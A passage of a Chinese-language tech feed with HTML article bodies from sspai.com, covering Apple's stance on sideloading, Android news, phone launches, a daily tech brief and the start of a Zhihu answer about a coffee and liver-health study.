Neuenschwander 在接受 <a href=\"https://www.fastcompany.com/90649203/apple-iphone-sideloading-safety-apps-tech\" target=\"_blank\">Fast Company</a> 专访时更是直言不讳地宣称：那些希望在手机上安装第三方来源应用的用户「可能要考虑其他操作系统」。</p>\n<p>虽然听起来火药味十足，但苹果高管这些言论也并非空穴来风：因为根据上个月 Epic 诉讼案中苹果 iOS&amp;macOS 开发主管 Craig Federighi 的证词显示，运行侧载应用的 macOS 如今的恶意软件数量与水平已经达到了「不可接受的程度」，并且如果 iOS 改用类似的策略，这一情况同样会威胁到 iOS 用户，而且作为日常很多时间都在贴身携带、且包括很多传感器的智能设备，手机的安全隐私情况一旦遭到威胁，所带来的后果很有可能更加严重。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/581616f1414b40e14517fc1fd7d81781\"><figcaption>隐私一向是苹果在宣传 iOS 优势时的主要内容</figcaption></figure><p>至少，iOS 的 App Store 应用审核机制并非苹果宣称的那样固若金汤，今年上次 App Store 上新闻头条，还是因为<a href=\"https://www.washingtonpost.com/technology/2021/06/06/apple-app-store-scams-fraud/\" target=\"_blank\">《华盛顿邮报》</a>专题调查指出：App Store 排名前一千位的应用程序中，有接近 2% 的应用为诈骗/恶意应用，同时上个月也有 <a href=\"https://www.vice.com/en/article/n7bbmz/the-fortnite-trial-is-exposing-details-about-the-biggest-iphone-hack-of-all-time\" target=\"_blank\">报道</a> 指出，由于开发者使用盗版 Xcode，接近 2500 个恶意程序被上传到 App Store 而未被发现，总计下载次数达到 2.03 亿次。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/2d50a0b77937c748cc2fd9b627bbd4ae.png\"></figure><p>有趣的是，与苹果一系列言论相对应，Google 似乎并不认为侧载应用能严重威胁到手机系统的安全，甚至在最新的 Android 12 更新中，Google 还加入了一套新标准<sup class=\"ss-footnote\" href=\"https://blog.google/products/android/android-12-beta/\" title=\"We’re also delivering on our promise to make third-party app stores easier to use on Android 12.\" footnote-id=\"1\">1</sup>，来帮助第三方应用商店在没有用户操作的情况下更方便的安装/更新应用。</p>\n<p>关于「侧载应用是否应该存在」这一争论短时间内还无法得出结果，但随着进来手机应用隐私问题逐渐变得更为主流，为了隐私安全所做出的妥协也被更多用户认可；但是，这并不代表侧载应用的使用群体正在消失。<br><br>总而言之，这一争论仍然会继续下去很长时间，但你只需要想清楚的需要，并基于此做出自己的选择就好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/4d35bef150e89ffb30bdd1a0a9fa57b1\"></figure><h3>2021 MD 设计奖评选开幕</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0ac172234ff1b3794ded3bd0b1ce4d4e\"></figure><p>从 2015 年开始，每年 Google 都会举办以质感设计（Material Design）为主题的设计评选，评选内容除了 Android 应用之外，还包括使用 MD 设计语言来开发的 iOS 及 Web 应用，而除了作为优秀设计案例给其他设计师参考之外，获奖应用开发者也都会获得奖杯以及在 Google 社交媒体上推广的机会 —— 对于应用开发者来讲，后一个条件毫无疑问会是一个绝佳的新用户获取机会。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/075ae6cfb0a5bcd011c911af851ec623\"></figure><p>上周，Google 已经正式开启了 2021 年度 MD 设计奖的评选活动，虽然目前投递通道已经正式开启：MD 设计奖采取的是自荐制度，如果你是应用开发者，今年你可以通过填写这个 <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSdqbNI74r8DN25g-35LN1CEa79B3bQJiWfWtgAtKVG1LpmXXA/viewform\" target=\"_blank\">报名表单</a> 来报名参赛；按照往年的惯例，今年的获奖者也将会在 12 月宣布。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/aa513ad636154c26aa7eb642587a8013\"></figure><p>和往年不同之处在于，今年的三个评选标准为「暗色模式」、「大屏幕适配」以及「动画效果」。如果你还不是很了解的话，下面是官方介绍的中文翻译版本：</p>\n<blockquote>\n<p><i><strong>暗色主题</strong></i></p>\n<p><i>在 2021 年，我们正在寻找既美观又耐看的好设计；无论白天还是黑夜，都能深思熟虑地应用显示的色彩和对比度，精心打造和谐不失个性化的应用体验。</i></p>\n<p><i><strong>大屏优化</strong></i></p>\n<p><i>你的设计如何适应与适应什么尺寸的显示设备同样重要：我们正在寻找这样的产品：其 UI 界面体现了适应性--从布局到组件 —— 跨越设备类型和屏幕尺寸，同时忠实表达其独特的身份、个性和功能。</i></p>\n<p><i><strong>动画效果</strong></i></p>\n<p><i>今年，我们正在寻找那些通过优雅的动画效果，使复杂的内容表达的简单灵动的品牌与产品。</i></p>\n</blockquote>\n<p>这三个维度将成为今年评选最终获奖应用的重要参考标准，这其实也很大程度上契合了 Android 近年来（尤其是 Android 12） 的设计发展主题，尤其是大屏优化，在过去多个 Android 版本中其实都有做强调，只是由于 Android 大屏幕生态发展不佳，所以一直收效甚微。</p>\n<p>如果你对前几年的 Google MD 设计奖评选结果有兴趣，想要按图索骥的找到好设计应用，那么你也可以参考 9to5Google 整理出的往年设计大奖评选结果；至于 2021 年的评选结果，我们也会在出炉的第一时间为大家详细介绍，敬请期待。</p>\n<p><strong>历年获奖名单 ｜</strong><i><strong> 9to5Google</strong></i></p>\n<ul>\n<li><a href=\"https://9to5google.com/2020/12/14/2020-material-design-award-winners/\" target=\"_blank\">2020</a></li>\n<li><a href=\"https://9to5google.com/2019/10/10/2019-material-design-awards-winners/\" target=\"_blank\">2019</a></li>\n<li><a href=\"https://9to5google.com/2018/10/31/2018-material-design-award-google/\" target=\"_blank\">2018</a></li>\n<li><a href=\"http://9to5google.com/2017/09/13/google-material-design-awards-2017/\" target=\"_blank\">2017</a></li>\n<li><a href=\"http://9to5google.com/2016/10/19/google-material-design-awards-for-2016-winning-android-apps/\" target=\"_blank\">2016</a></li>\n<li><a href=\"http://9to5google.com/2015/05/29/material-design-showcase-awards/\" target=\"_blank\">2015</a></li>\n</ul>\n<h3>高高高性价比 Android 手机</h3>\n<p>作为国内用户，这两年千元机市场硝烟浓度已经比过去红米/魅蓝两家称霸市场的时代低很多了，大家也都习惯了 ¥799、¥1099 这些价位的是极致性价比 Android 手机的普遍价位；但放眼全球，其实包括南亚/东南亚在内的很多市场，对于更低价位的智能手机需求更加迫切：也正是基于这种现实情况，我们之前听到的「售价仅 ¥32 人民币的智能手机」这类新闻大部分都出自印度。</p>\n<p>本周，Google 和印度本土的手机制造商/运营商信实（Jio）合作，<a href=\"https://india.googleblog.com/2021/06/partnering-with-jio-to-help-bring.html\" target=\"_blank\">发布</a> 了一款搭载订制 Android Go 系统的新机 JioPhone Next，这款手机主打卖点就是超低的售价：信实号称这将是「史上售价最低的 Android 手机」，虽然这款手机的最终售价尚未公布，但预计不会超过 300 人民币（甚至有可能低于 150 人民币），将在 9 月 10 日上市。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/11bfd1de79c4caf54c256d0df72f3eca\"></figure><p>除了售价之外，作为与 Google 联合订制的产物，这款手机在软件上相比于其他 Android Go 机型也有更多本土化订制：比如自动朗读屏幕内容以及翻译功能，就是针对印度识字率偏低以及各个邦之间通用语言不不同的问题，同时也有 Google 带来的「持续功能更新与最新的系统更新」，这些都是以往同类甚至更高价位中难得一见的高质量软件服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/67b9bab5513b8d8c3b77247a2826d294\"></figure><p>当然，在硬件配置上就完全不用期望太多了，而且考虑到 Jio 以往的手机销售模式，这款手机很可能需要用户搭配套餐一起使用。总之，价格再低的手机，也难逃一分价钱一分货这个道理咯。</p>\n<h3>160W 有线快充</h3>\n<p>如果你有关注我们的 Twitter，或许已经有在过去几个月中了解到关于「某个不知名的厂商即将发布一款支持 160W 快充的手机」这件事，而现在，这个「不知名的厂商」 —— 也就是 Infinix，已经公布了关于这款手机的更多信息：除了支持 160W 有线快充之外，它还支持 50W 无线充电，官方宣称有线充电能在 10 分钟内充满 4000mAh 容量的电池。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/b7e251cd05db260d11fdb27028689ef0\"></figure><p>即使你是超级数码发烧友，也有很大概率没有听说过 Infinix 这个品牌，但与此相关的另一个手机品牌「传音」，可能不少人还是略有耳闻的；没错，Infinix 同样也是传音旗下的手机品牌。</p>\n<p>虽然传音旗下的品牌往年一直是以低端机的面貌示人，但近年来随着品牌发展加上新市场的拓展，传音旗下品牌也开始注重系统更新以及硬件规格等以往一线厂商才会去特别关注的事情：比如在今年的 Android 12 Beta OEM 测试中，我们就能看到来自传音旗下品牌 TECNO 的一款机型参与到 Beta 1 测试，这也是 Android Beta 测试计划历史上首次出现来自 OEM 厂商的中低端设备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/f8fe81770d107613ca3ad7381a0be49a\"></figure><p>这么一对比，Infinix 在充电规格上「放飞自我」，其实也不是那么令人感到意外，而且和夸张的充电规格相比，这款手机的其他硬件规格就没那么亮眼了：搭载 Helio G95 SoC，只支持 4G，性能大致相当于骁龙 720G；8+128G 存储组合，不过同样和前期高调的宣传不太搭调的是，这款手机只是一部概念机，也就是说这款手机并不会最终上市。</p>\n<p>除了充电规格之外，Infinix 这款概念机的后壳还采用了电致变色膜片工艺，能在在银色与蓝色之前切换显示，并且还可以在手机充电时闪烁；不过早先我们已经有在 OPPO Reno 5 Pro+ 的限定版上有看到类似技术，而且考虑到 Infinix 这款炫技的概念机最终也并不会正式上市，这里就不再赘述。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0faf4627ad9957efdf293c4cc523e010\"></figure><h3>Android App 多平台适配</h3>\n<p>虽然 Android 应用生态毫无疑问发展的枝繁叶茂，但这一优势却很难像 Apple 生态那样，快速普及至供智能手表使用的 Wear OS 以及 Android 平板等同一底层但针对不同设备的操作系统上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/501e9ffc5449311f1d8e75e4a803f9d4\"></figure><p> </p>\n<p>究其原因，还是由于不少 Android 开发者认为 Android 智能手表、平板生态的普及率太低，开发应用投入/回报不成正比所导致，但这一现象进一步导致了 WearOS 以及 Android 平板生态口碑以及使用体验的不佳，看起来这似乎是一个难以摆脱的恶性循环。</p>\n<p>不过，Google 似乎正在就这个问题，提供一个更加简单（或许也更有效）的解决方式：从本周 <a href=\"https://android-developers.googleblog.com/2021/06/continuing-to-boost-developer-success.html\" target=\"_blank\">Android Dev Blog</a> 更新文章中的内容来看，Google 将会为提供多平台支持的应用开发者降低应用服务费抽成比例 —— 最高可减少 15% 的服务费抽成。</p>\n<p>想要获得这一降低抽成激励 ，开发者必须要根据自己开发应用的种类，针对不同的平台/设备形态进行优化：比如视频 App 就需要同时支持 Android TV/Google TV 以及 Cast 功能、音乐流媒体服务需要支持 Wear OS、Android Auto 等穿戴、车载平台；阅读类 App 则是必须为平板、折叠屏手机等大屏 Android 设备做好优化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/854952e208f864e0d003ff898f844e82\"></figure><p>看起来这似乎的确是一个不错的解决方案，但前提是一款应用服务真的特别依赖 Android 应用生态所带来的收入，且有足够的资源来为更多平台开发 App，所以除了这种政策上的激励计划之外，Google 同样应该在应用开发层面，帮助更多开发者降低多平台应用之间的开发成本，这样才能让更多应用会去适配 Android 生态不同设备。</p>\n<h3>One UI Watch 发布</h3>\n<p>和之前预计的一样：三星在上周的 MWC 活动中公布了关于新智能手表操作系统 One UI Watch 的更多信息，虽然没有新款手表正式发布，但至少让我们得以对接下来基于新版 Wear OS 而来 Galaxy Watch 得以有一个大致的猜测。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/be5c89d5db1eb37a0348bddfc4cfad19\"></figure><p>在设计风格上，One UI Watch 系统如其名和手机版 One UI 基本保持一致，同时三星还公布了一些关于新版 Wear OS 的系统优化细节：除了基于 Wear OS 底层所带来的大量应用可供下载之外，当用户在手机上下载应用程序时，手表会自动同步下载 Wear OS 的对应版本，在手机上的各种应用设置，也会自动同步至手表系统中：比如屏蔽的号码、设置的应用主题等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/10aee96839acdf38a73e889b99425a8f\"></figure><p>此外三星还表示，他们针对 Wear OS 还发布了一款表盘设计工具，可以让更多开发者更加轻松地去创建自己的表盘，以及在各种表盘上控制显示哪些数据，虽然现在这一工具还尚未公布，但我们大概可以期待一下自己动手做表盘这件事了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/151dd7da1da4c871275c2cc0c5c343c7\"></figure><h3>Google 搜索结果提示</h3>\n<p>据 <a href=\"https://www.vox.com/recode/2021/6/24/22549157/google-unreliable-search-results-changing-quickly-misinformation-conspiracy-theories\" target=\"_blank\">Recode</a> 报道，Google 于本周开始测试一项新功能，既当用户在搜索引擎上搜索一些快速发展的内容话题 —— 比如当前正在变化的突发新闻事件、关于 UFO 的目击报告等，会在搜索结果上方出现一条提示，提示用户当前部分搜索结果仍然在更新中，更可靠的信息来源仍然需要时间去更新。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/3e65d20f4648a61bd1e39c01908d7506\"></figure><p>这一功能目前只在一小部分地区推出，但 Google 解释，这一更新并不是试图证明某些搜索结果时正确或是错误的，只是想提醒用户多加注意搜索结果给出的内容：毕竟在过去两年中，互联网上的错误信息以及阴谋论、未经核实的新闻报道已经成为 Google 搜索引擎需要解决的重大问题之一，除了直接取缔内容来源之外，教育用户认识到「你搜索到的并不全是真实的」也是重要的一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/09c4041d577a5c62dfd9b0fe033717bb\"></figure><h3><a href=\"https://spectrum.ieee.org/view-from-the-valley/consumer-electronics/audiovideo/the-iphone-12-mini-makes-me-sick-literally\" target=\"_blank\"><i>The iPhone 12 Mini Makes Me Sick (Literally)</i></a></h3>\n<blockquote><p>手机厂商不喜欢谈论 OLED 显示屏闪烁问题，但对敏感的用户来讲，这是一个噩梦</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/336d8ad58b45bdc4435acb30dae055a7\"></figure><p><strong>IEEE（电器电子工程师学会专刊）</strong>｜作者是一位刚从初代 iPhone SE 换到 iPhone 12 mini 的小屏手机用户，但在新手机刚到手没多久，作者就在使用手机时感受到头晕的症状，即使是在使用一星期之后仍然如此。</p>\n<p>在 Google 搜索之后，这位用户确定了导致他眩晕的罪魁祸首 —— OLED 屏幕的 PWM 调光带来的频闪导致，而 PWM 调光的原理则是通过控制屏幕灯柱的亮暗闪烁，借助人眼短暂的停留记忆实现约等于调节亮度的效果，而这就又可能导致引发部分敏感用户出现各种不适症状：包括头痛、恶心，甚至晕动症以及癫痫等情况。</p>\n<p>其实 PWM 调光所带来的频闪问题已经并不新鲜，除了 iPhone 之外，小米、三星、华为等厂商都在广泛使用 PWM 调光技术，随着 OLED 材质显示屏逐渐覆盖越来越多智能手机的当下，由此引发的头晕、恶心等案例报告也越来越多，甚至大部分用户并不明白为什么自己会在长时间看手机之后感到不适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/f63b91e544a1ef9fa394478d56fc6c66.png\"><figcaption>PWM 频闪情况 ｜ DXO</figcaption></figure><p>在本文的最后，作者将 iPhone 12 mini 换成了使用 LCD 屏幕的 iPhone SE2，也呼吁行业对这一问题进行深入研究，来避免更多人在实际使用中受到影响。同时作者也特别提到了中国在这一研究领域的努力：比如强制要求显示设备制造商改变硬件规格来避免导致这一问题，很多研究机构与眼科医生也与作者沟通过与此相关的技术问题。</p>\n<h3><a href=\"https://www.nytimes.com/2021/06/21/technology/sundar-pichai-google.html\" target=\"_blank\"><i>Google Executives See Cracks in Their Company’s Success</i></a></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/093a83f2379f213295d4dc398e5a0e5b.png\"><figcaption>Christie Hemm Klok for The New York Times</figcaption></figure><p><strong>NYTimes（纽约时报）</strong>｜作为一家巨型商业公司，如今 Google 除了运营着全球 14 万的员工，还要和全球各地的监管机构斗争，以及面临更多的批评与指责；Google 过去经常热衷于裁撤那些对公司业务帮助不大的开发项目，包括 Stadia 云游戏这样在外界看来具有战略意义的服务布局，如今也已经被裁撤的不复当年，这也直接导致大批技术人才/高管出走 Google。</p>\n<p>在本篇专题报道中，有共计 15 位不愿透露姓名的现任/前 Google 高管透露：Google 已经掉入许多大型商业公司都会出现的问题陷阱：瘫痪的官僚主义、不作为与偏见，面对大众看法时的偏执，都是导致问题的因素。</p>\n<p>在本文中，作者将问题直指在外人看来非常低调、和蔼可亲的 Google 现任 CEO 桑达尔-皮查伊（Sundar Pichai），发出质疑「好人同时也会是一个优秀的 CEO 吗？」，同时作者也针对部分离职高管的情况进行深度采访，是一篇了解当前 Google 内部问题的优秀调查报道。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/ec5b64a409e2ef1a4c73a4f2ec77c955\"></figure><h3>Android 12 时钟小组件</h3>\n<p>Android 12 目前已经更新到了 Beta 2 版本，大部分功能都已经可以正常使用，唯独 I/O 大会中公布的部分小组件至今仍未加入，好在其实已经有开发者提前照葫芦画瓢，做出了 Android 12 中新增的时钟小组件，给期待许久仍然未果的发烧友解馋。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/6d3a1e2465c77f096b7b08d86f0f8508\"></figure><p>应用中共提供了五种不同样式的时钟小组件，五种样式均可免费使用，花费 $0.99 则可以解锁更多颜色/主题样式，当然也没有 Android 12 的版本限制，你可以在 <a href=\"https://play.google.com/store/apps/details?id=twelve.clock.mibrahim\" target=\"_blank\">Play Store</a> 免费下载到这款应用。</p>\n<h3>其他应用动态</h3>\n<ul><li>据 <a href=\"https://www.androidpolice.com/2021/06/29/google-phone-beta-is-making-it-easier-to-find-that-number-you-dialed-that-one-time/\" target=\"_blank\">Android Police</a> 报道，Google Phone 应用现在可以在拨号盘中提示你最近拨打过的电话 —— 即使你并没有将其保存到通讯录中，这个功能对于买外卖或是修车这样临时需要多次沟通的场景还是蛮方便的。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/afbebc3e82de3bfa2cf8abff6c9c61e0\"></figure><ul><li>早先已经针对部分 Android 12 Beta 系统用户推送的新版「探索」界面，本周开始大面积推送，但目前看来这一更新仍然局限于 Android 12 设备，新版 UI 界面采用 Material You 设计语言，，让整体 UI 更加简单简洁。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/a4924bc1c673b077cbb7645025d6f94e\"></figure><h2>彩蛋</h2>\n<p>一加 CEO 刘作虎本周在 <a href=\"https://twitter.com/PeteLau/status/1407328708348760068?s=20\" target=\"_blank\">Twitter</a> 上公布了一张有趣的一加 9 系列「零售包装」：直接采用了透明塑料 + 纸壳的挂架包装设计，手机左侧列举出了这款商品的卖点；让手机看起来就像是一个在货架上等待零售的普通玩具一样。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/7568fee443a343346be9bc6338e78aa9\"></figure><p><strong>下周见～</strong></p>\n<p>反馈请联系 Email：<code>editorinchief@safaricheung.pro</code></p>\n<p>欢迎订阅 Substack 获取 <a href=\"https://update.substack.com/p/refresh-13windows-11-android\" target=\"_blank\">本期文章</a>。</p>\n<p><strong>鸣谢</strong>：</p>\n<ul>\n<li><a href=\"https://t.me/NewlearnerChannel\" target=\"_blank\">Newlearnerの自留地</a></li>\n<li>Designed by Update Media</li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67496"},{"title":"派早报：小米推出旗舰级笔记本、诺基亚新机或将搭载鸿蒙系统等","date":"2021-07-01 00:39:41","description":"\n<h2>小米公司推出小米笔记本 Pro X 15</h2>\n<p>6 月 30 日，小米公司推出了旗舰级笔记本电脑小米笔记本 Pro X 15，小米笔记本 Pro X 15 搭载第 11 代 i5 或 i7 处理器及 Nvidia GeForce RTX 3050Ti 独立显卡，配备 15.6 英寸的 OLED 显示屏，分辨率达到 3456 x 2160。该机拥有 Harman 定制的扬声器系统，内存最高至 32 GB，存储空间最高至 1 TB。</p>\n<p>小米笔记本 Pro X 15 首发价 7999 元起，顶配价格为 9999 元，目前已开启预约。<a href=\"https://www.mi.com/buy/detail?product_id=10000301\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/article/dbf3225303a318b12859e554da6c9478\"><figcaption>图片来自小米网站</figcaption></figure><h2>Google 将取代 APK 应用分发格式</h2>\n<p>6 月 29 日 Google 通过开发者博客宣布，2021 年 8 月开始，Google Play 将要求所有新应用以 Android App Bundle 的格式（AAB）进行打包和分发，此前主要以 OBB 格式保存的额外数据包则要求采用 Play Asset Delivery 和 Play Feature Delivery 服务进行推送；已上架应用暂时不受影响。此举将正式取代以 APK 格式安装包为主的应用分发方式。<a href=\"https://android-developers.googleblog.com/2021/06/the-future-of-android-app-bundles-is.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/32af6b0e2871f4ad37c206f8941193af\"></figure><h2>Apple 开放首个 iOS 15 Public Beta 版本</h2>\n<p>Apple 目前已经开放了 iOS 15 及 iPadOS 15 的首个 Public Beta 版本，该版本允许非开发者身份的用户参与新系统测试，使用需要参与测试的设备登录 <a href=\"https://beta.apple.com/sp/betaprogram/\" target=\"_blank\">Apple Beta Software Program</a> 网站并进行注册，即可体验新系统。<a href=\"https://www.macrumors.com/\" target=\"_blank\">来源</a></p>\n<h2>Apple 零售店取货服务登陆中国大陆</h2>\n<p>6 月 30 日，Apple 公司宣布，正式在中国大陆启动零售店取货服务。从宣布当日起，用户在 Apple 网站购买产品，可以指定到线下零售店取货，最快一小时即可领取。<a href=\"https://www.apple.com.cn/newsroom/2021/06/apple-pickup-now-available-in-mainland-china/\" target=\"_blank\">来源</a></p>\n<h2>诺基亚将推出 X60 系列新品，或搭载鸿蒙系统</h2>\n<p>诺基亚公司预计在年内推出旗下新品手机 X60 系列。X60 系列包含 X60 及 X60 Pro 两款机型，搭载曲面屏及大容量电池，或将使用鸿蒙操作系统。此外，X60 手机还将配备 2 亿像素主摄，定位影像旗舰。<a href=\"https://money.udn.com/money/story/5930/5568500\" target=\"_blank\">来源</a></p>\n<h2>群晖科技正式发布 DSM 7.0</h2>\n<p>群晖科技（Synology）于 6 月 29 日发布其 NAS 系统 DiskStation Manager 7.0（DSM 7.0）正式版本，新系统强化了系统安全性与可用性，并新增智慧管理服务、系统安全验证、海量数据存储等功能。其中，安全性更高的身份验证应用 Secure SignIn，可以实现更轻松和简便的双重验证、智慧监测多台 NAS 使用状况以提供进阶服务的 Active Insight 等。目前，群晖旗下的 Plus、Value 和 J 系列产品可以手动下载更新进行升级，而适用于 DS、SA、XS / XS+、DVA 系列型号的 DSM 7.0 将在下个季度正式发布。<a href=\"https://m.weibo.cn/status/4653522882661634?wm=3333_2001&amp;from=10B6293010&amp;sourcetype=weixin\" target=\"_blank\">来源</a></p>\n<h2>微软确认近年不会推出 Xbox 后续机型</h2>\n<p>微软 Xbox 业务主管菲尔・斯宾塞近期在接受访问时表示，Xbox 近几年将不会推出新款机型，微软将继续着力普及云游戏。<a href=\"https://www.ithome.com/0/560/185.htm\" target=\"_blank\">来源</a></p>\n<h2>《控制》开发团队或将推出多人合作衍生作品</h2>\n<p>动作游戏《控制》（<i>Control</i>）的开发商 Remedy Entertainment 和 505 Games 近期达成协议，将联合开发多人合作游戏。该作基于《控制》衍生，开发代号为 <i>Condor</i>，游戏形式可能为四名玩家组队对抗《控制》中的敌人 Hiss。此外，双方还有为《控制》开发续作的打算，但该计划目前尚在讨论阶段。<a href=\"https://cn.engadget.com/control-spin-off-multiplayer-co-op-remedy-505-063050026.html\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>🎧 <a href=\"https://sspai.com/prime/podcast/Precog-Channel-01-All-About-PUA\" target=\"_blank\">溯源、演变以及泛化和误用——关于 PUA，我们一次聊清楚</a>\n</li>\n<li>👌 <a href=\"https://sspai.com/post/67474\" target=\"_blank\">医院做的这些「拍片」检查，你可以多了解一点</a>\n</li>\n<li>✈️ <a href=\"https://sspai.com/post/66510\" target=\"_blank\">快乐飞旅行报告 05：两天的贵阳都是吃</a>\n</li>\n<li>⚙️ <a href=\"https://sspai.com/post/67331\" target=\"_blank\">macOS 如何限制进程 CPU 占用</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67494"},{"title":"新研究称喝咖啡有助保护肝脏，是真的吗？","date":"2021-06-30 23:06:47","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8d4b733bc79eed4466151f2b22244cb2_l.jpg?source=8673f162\"><span>浩浩耗，</span><span>我有屠龙之术，欲翻流云起舞；我有苍茫之志，欲煎七海成田；</span>\n<a href=\"https://www.zhihu.com/question/468425699/answer/1968844231\" hidden>阅读原文</a>\n</div>\n<div>\n<p>好吧，我只不过就是简单的解读了一下这篇论文的内容，而且还写了个人觉得，对结论参考值得思考的地方。还是有朋友觉得我是在卖咖啡，我一小渣渣有能力帮一个产业带货？太看得起我了 哈哈</p>\n<p>那我就把核心部分放在最前面吧，并且提醒大家：<strong>平时不怎么喝咖啡的，千万不要因为这个结论改变自己的习惯，因为 没有用，没有用，没有用！！！</strong></p>\n<p><strong>原因我原文写在最后，那就先提上来吧</strong></p>\n<blockquote>当然，这项研究的结论因为其样本人群数量很大，所以还是有相当的可信度和说服力的。但对于我们中国人来说，也只能作为一个参考，并不能完全照搬结论。原因如下：<br>首先，因为中国人与欧洲人群存在着很大的遗传背景差异，同时生活环境和饮食习惯也有很大的差异，而这项研究的人群主要都是英国人，因此是否同样的结论能够在中国人群数据上重复，还是一个未知数。<br>其次，所谓“抛开计量谈效果，就是耍流氓”，虽然近年来，我国的咖啡饮用量正在逐步上升，但相对而言还是远远低于欧美人群的。比如这项研究里，喝咖啡的人群，其每天饮用量的中位数是 2 杯，而我国人群对咖啡的平均饮用量明显是要低于这个量的。因此，是否摄入咖啡需要满足一定的量，才会起到保护肝脏的作用，仍然是一个值得进一步研究的问题。</blockquote>\n<p><strong>原回答：——————————————————————————</strong></p>\n<p>慢性肝病，近些年来在全球范围内的死亡率和发病率，都一直在持续增长。而之前有一些研究结果发现，咖啡消耗较多的地区，患慢性肝病的比例相对偏低，但具体原因，是否与咖啡的类型相关，都还没有具体的结论。</p>\n<p>近期，一项基于英国人群大数据的研究结果发表，对这些疑问有了进一步的解答。那关于这项研究，这些核心知识点值得了解：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-eace9859861ff1b6f9ac8b62b63e84a2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>I. 首先，整个研究项目的入组人群数接近 50 万人（其中约 39 万人有喝咖啡的习惯，另外 11 万人是不喝咖啡的），入组的人群不仅有平常饮用咖啡量的数据，也有其电子病例等临床数据。因此，这样数量的研究人群，几乎可以说是史无前例的。</p>\n<p>II. 研究同时分析了不同类型的咖啡，包括研磨咖啡，速溶咖啡和不含咖啡因的咖啡（decaffeinated）。</p>\n<p>III. 整个研究结果跟踪的时长中位数为 10.7 年，在这个过程中，有接近 1 万人，出现了慢性肝病相关的症状。</p>\n<p>IV. 研究结果发现，无论是喝哪一种咖啡，患慢性肝病的比例都显著低于不喝咖啡的人群。同时，相对而言，喝研磨咖啡的人患慢性肝病的风险（Hazard ratios=0.65）比其它两种类型的咖啡更小。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e27b3ed5703043e41de139183236d4ba_720w.jpg?source=8673f162\" 